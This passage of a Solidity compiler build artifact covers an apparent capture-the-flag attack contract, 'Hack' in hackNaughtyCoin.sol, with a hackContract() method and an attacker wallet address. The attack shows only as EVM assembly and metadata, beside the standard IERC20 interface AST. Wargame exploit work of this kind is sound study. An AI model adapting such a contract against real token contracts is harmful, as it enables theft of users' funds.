											"begin": 2525,
											"end": 2534,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2521,
											"end": 2538,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2512,
											"end": 2518,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 2455,
											"end": 2539,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 2455,
											"end": 2539,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 2455,
											"end": 2539,
											"name": "tag",
											"source": 2,
											"value": "76"
										},
										{
											"begin": 2455,
											"end": 2539,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2409,
											"end": 2546,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2409,
											"end": 2546,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2409,
											"end": 2546,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2409,
											"end": 2546,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2409,
											"end": 2546,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 2552,
											"end": 2774,
											"name": "tag",
											"source": 2,
											"value": "15"
										},
										{
											"begin": 2552,
											"end": 2774,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2552,
											"end": 2774,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2683,
											"end": 2685,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 2672,
											"end": 2681,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2668,
											"end": 2686,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2660,
											"end": 2686,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2660,
											"end": 2686,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2696,
											"end": 2767,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "78"
										},
										{
											"begin": 2764,
											"end": 2765,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2753,
											"end": 2762,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2749,
											"end": 2766,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2740,
											"end": 2746,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 2696,
											"end": 2767,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 2696,
											"end": 2767,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 2696,
											"end": 2767,
											"name": "tag",
											"source": 2,
											"value": "78"
										},
										{
											"begin": 2696,
											"end": 2767,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2650,
											"end": 2774,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2650,
											"end": 2774,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2650,
											"end": 2774,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2650,
											"end": 2774,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2650,
											"end": 2774,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 2780,
											"end": 2876,
											"name": "tag",
											"source": 2,
											"value": "57"
										},
										{
											"begin": 2780,
											"end": 2876,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2780,
											"end": 2876,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2846,
											"end": 2870,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "80"
										},
										{
											"begin": 2864,
											"end": 2869,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2846,
											"end": 2870,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "81"
										},
										{
											"begin": 2846,
											"end": 2870,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 2846,
											"end": 2870,
											"name": "tag",
											"source": 2,
											"value": "80"
										},
										{
											"begin": 2846,
											"end": 2870,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2835,
											"end": 2870,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2835,
											"end": 2870,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2825,
											"end": 2876,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2825,
											"end": 2876,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2825,
											"end": 2876,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2825,
											"end": 2876,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 2882,
											"end": 2972,
											"name": "tag",
											"source": 2,
											"value": "82"
										},
										{
											"begin": 2882,
											"end": 2972,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2882,
											"end": 2972,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2959,
											"end": 2964,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2952,
											"end": 2965,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 2945,
											"end": 2966,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 2934,
											"end": 2966,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2934,
											"end": 2966,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2924,
											"end": 2972,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2924,
											"end": 2972,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2924,
											"end": 2972,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2924,
											"end": 2972,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 2978,
											"end": 3104,
											"name": "tag",
											"source": 2,
											"value": "81"
										},
										{
											"begin": 2978,
											"end": 3104,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2978,
											"end": 3104,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3055,
											"end": 3097,
											"name": "PUSH",
											"source": 2,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3048,
											"end": 3053,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 3044,
											"end": 3098,
											"name": "AND",
											"source": 2
										},
										{
											"begin": 3033,
											"end": 3098,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3033,
											"end": 3098,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3023,
											"end": 3104,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3023,
											"end": 3104,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3023,
											"end": 3104,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3023,
											"end": 3104,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 3110,
											"end": 3187,
											"name": "tag",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 3110,
											"end": 3187,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3110,
											"end": 3187,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3176,
											"end": 3181,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3165,
											"end": 3181,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3165,
											"end": 3181,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3155,
											"end": 3187,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3155,
											"end": 3187,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3155,
											"end": 3187,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3155,
											"end": 3187,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 3193,
											"end": 3345,
											"name": "tag",
											"source": 2,
											"value": "61"
										},
										{
											"begin": 3193,
											"end": 3345,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3193,
											"end": 3345,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3289,
											"end": 3339,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "87"
										},
										{
											"begin": 3333,
											"end": 3338,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 3289,
											"end": 3339,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "88"
										},
										{
											"begin": 3289,
											"end": 3339,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 3289,
											"end": 3339,
											"name": "tag",
											"source": 2,
											"value": "87"
										},
										{
											"begin": 3289,
											"end": 3339,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3276,
											"end": 3339,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3276,
											"end": 3339,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3266,
											"end": 3345,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3266,
											"end": 3345,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3266,
											"end": 3345,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3266,
											"end": 3345,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 3351,
											"end": 3477,
											"name": "tag",
											"source": 2,
											"value": "88"
										},
										{
											"begin": 3351,
											"end": 3477,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3351,
											"end": 3477,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3447,
											"end": 3471,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "90"
										},
										{
											"begin": 3465,
											"end": 3470,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 3447,
											"end": 3471,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "81"
										},
										{
											"begin": 3447,
											"end": 3471,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 3447,
											"end": 3471,
											"name": "tag",
											"source": 2,
											"value": "90"
										},
										{
											"begin": 3447,
											"end": 3471,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3434,
											"end": 3471,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3434,
											"end": 3471,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3424,
											"end": 3477,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3424,
											"end": 3477,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3424,
											"end": 3477,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3424,
											"end": 3477,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 3483,
											"end": 3599,
											"name": "tag",
											"source": 2,
											"value": "43"
										},
										{
											"begin": 3483,
											"end": 3599,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3553,
											"end": 3574,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "92"
										},
										{
											"begin": 3568,
											"end": 3573,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3553,
											"end": 3574,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "82"
										},
										{
											"begin": 3553,
											"end": 3574,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 3553,
											"end": 3574,
											"name": "tag",
											"source": 2,
											"value": "92"
										},
										{
											"begin": 3553,
											"end": 3574,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3546,
											"end": 3551,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3543,
											"end": 3575,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 3533,
											"end": 3535,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "93"
										},
										{
											"begin": 3533,
											"end": 3535,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 3589,
											"end": 3590,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3586,
											"end": 3587,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 3579,
											"end": 3591,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 3533,
											"end": 3535,
											"name": "tag",
											"source": 2,
											"value": "93"
										},
										{
											"begin": 3533,
											"end": 3535,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3523,
											"end": 3599,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3523,
											"end": 3599,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 3605,
											"end": 3727,
											"name": "tag",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 3605,
											"end": 3727,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3678,
											"end": 3702,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "95"
										},
										{
											"begin": 3696,
											"end": 3701,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3678,
											"end": 3702,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 3678,
											"end": 3702,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 3678,
											"end": 3702,
											"name": "tag",
											"source": 2,
											"value": "95"
										},
										{
											"begin": 3678,
											"end": 3702,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3671,
											"end": 3676,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3668,
											"end": 3703,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 3658,
											"end": 3660,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "96"
										},
										{
											"begin": 3658,
											"end": 3660,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 3717,
											"end": 3718,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3714,
											"end": 3715,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 3707,
											"end": 3719,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 3658,
											"end": 3660,
											"name": "tag",
											"source": 2,
											"value": "96"
										},
										{
											"begin": 3658,
											"end": 3660,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3648,
											"end": 3727,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3648,
											"end": 3727,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"balance()": "b69ef8a8",
							"hackContract()": "7ca2474e",
							"naughtyCoin()": "14f719d0"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.0+commit.c7dfd78e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"balance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"hackContract\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"naughtyCoin\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/hackNaughtyCoin.sol\":\"Hack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0x9750c6b834f7b43000631af5cc30001c5f547b3ceb3635488f140f60e897ea6b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a7d5b1ef5d8d5889ad2ed89d8619c09383b80b72ab226e0fe7bde1636481e34\",\"dweb:/ipfs/QmebXWgtEfumQGBdVeM6c71McLixYXQP5Bk6kKXuoY4Bmr\"]},\"contracts/hackNaughtyCoin.sol\":{\"keccak256\":\"0xc38c23a431f58532d6dd7375995ad097be1a951ba9918c3771d38f2adca1d18d\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://1bcb40701e9e08b1dc25f5fd687b6f400a9f2710ff95deb75e15506504b968bb\",\"dweb:/ipfs/QmXsjNyiJAZUppya9tRmkmrchGezNVdB3oWFvDVBngbWjq\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 83,
								"contract": "contracts/hackNaughtyCoin.sol:Hack",
								"label": "naughtyCoin",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(IERC20)77"
							},
							{
								"astId": 86,
								"contract": "contracts/hackNaughtyCoin.sol:Hack",
								"label": "myWallet",
								"offset": 0,
								"slot": "1",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_contract(IERC20)77": {
								"encoding": "inplace",
								"label": "contract IERC20",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"ast": {
					"absolutePath": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
					"exportedSymbols": {
						"IERC20": [
							77
						]
					},
					"id": 78,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "106:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 2,
								"nodeType": "StructuredDocumentation",
								"src": "131:70:0",
								"text": " @dev Interface of the ERC20 standard as defined in the EIP."
							},
							"fullyImplemented": false,
							"id": 77,
							"linearizedBaseContracts": [
								77
							],
							"name": "IERC20",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": {
										"id": 3,
										"nodeType": "StructuredDocumentation",
										"src": "225:158:0",
										"text": " @dev Emitted when `value` tokens are moved from one account (`from`) to\n another (`to`).\n Note that `value` may be zero."
									},
									"id": 11,
									"name": "Transfer",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 10,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 5,
												"indexed": true,
												"mutability": "mutable",
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "403:20:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 4,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "403:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 7,
												"indexed": true,
												"mutability": "mutable",
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "425:18:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 6,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "425:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 9,
												"indexed": false,
												"mutability": "mutable",
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "445:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 8,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "445:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "402:57:0"
									},
									"src": "388:72:0"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 12,
										"nodeType": "StructuredDocumentation",
										"src": "466:148:0",
										"text": " @dev Emitted when the allowance of a `spender` for an `owner` is set by\n a call to {approve}. `value` is the new allowance."
									},
									"id": 20,
									"name": "Approval",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 14,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 20,
												"src": "634:21:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 13,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "634:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 16,
												"indexed": true,
												"mutability": "mutable",
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 20,
												"src": "657:23:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 15,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "657:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 18,
												"indexed": false,
												"mutability": "mutable",
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 20,
												"src": "682:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 17,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "682:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "633:63:0"
									},
									"src": "619:78:0"
								},
								{
									"documentation": {
										"id": 21,
										"nodeType": "StructuredDocumentation",
										"src": "703:66:0",
										"text": " @dev Returns the amount of tokens in existence."
									},
									"functionSelector": "18160ddd",
									"id": 26,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "totalSupply",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 22,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "794:2:0"
									},
									"returnParameters": {
										"id": 25,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 24,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 26,
												"src": "820:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 23,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "820:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "819:9:0"
									},
									"scope": 77,
									"src": "774:55:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 27,
										"nodeType": "StructuredDocumentation",
										"src": "835:72:0",
										"text": " @dev Returns the amount of tokens owned by `account`."
									},
									"functionSelector": "70a08231",
									"id": 34,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 30,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 29,
												"mutability": "mutable",
												"name": "account",
												"nodeType": "VariableDeclaration",
												"scope": 34,
												"src": "931:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 28,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "931:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "930:17:0"
									},
									"returnParameters": {
										"id": 33,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 32,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 34,
												"src": "971:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 31,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "971:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "970:9:0"
									},
									"scope": 77,
									"src": "912:68:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 35,
										"nodeType": "StructuredDocumentation",
										"src": "986:202:0",
										"text": " @dev Moves `amount` tokens from the caller's account to `to`.\n Returns a boolean value indicating whether the operation succeeded.\n Emits a {Transfer} event."
									},
									"functionSelector": "a9059cbb",
									"id": 44,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 40,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 37,
												"mutability": "mutable",
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 44,
												"src": "1211:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 36,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1211:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 39,
												"mutability": "mutable",
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"scope": 44,
												"src": "1223:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 38,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1223:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1210:28:0"
									},
									"returnParameters": {
										"id": 43,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 42,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 44,
												"src": "1257:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 41,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1257:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1256:6:0"
									},
									"scope": 77,
									"src": "1193:70:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 45,
										"nodeType": "StructuredDocumentation",
										"src": "1269:264:0",
										"text": " @dev Returns the remaining number of tokens that `spender` will be\n allowed to spend on behalf of `owner` through {transferFrom}. This is\n zero by default.\n This value changes when {approve} or {transferFrom} are called."
									},
									"functionSelector": "dd62ed3e",
									"id": 54,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allowance",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 50,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 47,
												"mutability": "mutable",
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 54,
												"src": "1557:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 46,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1557:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 49,
												"mutability": "mutable",
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 54,
												"src": "1572:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 48,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1572:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1556:32:0"
									},
									"returnParameters": {
										"id": 53,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 52,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 54,
												"src": "1612:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 51,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1612:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
